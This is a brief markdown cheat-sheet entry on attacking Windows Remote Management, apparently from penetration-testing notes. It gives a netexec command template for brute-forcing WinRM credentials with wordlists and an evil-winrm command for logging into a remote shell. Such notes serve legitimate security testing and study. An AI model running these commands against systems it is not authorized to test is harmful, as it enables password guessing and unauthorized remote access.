
## WinRM Exploitation

### Bruteforce Attack WinRM

```bash
netexec winrm <TARGET IP> -u <username/user wordlist> -p <password/password wordlist>
```

### Login WinRM

```bash
evil-winrm -i <TARGET IP> -u <username> -p <password>
```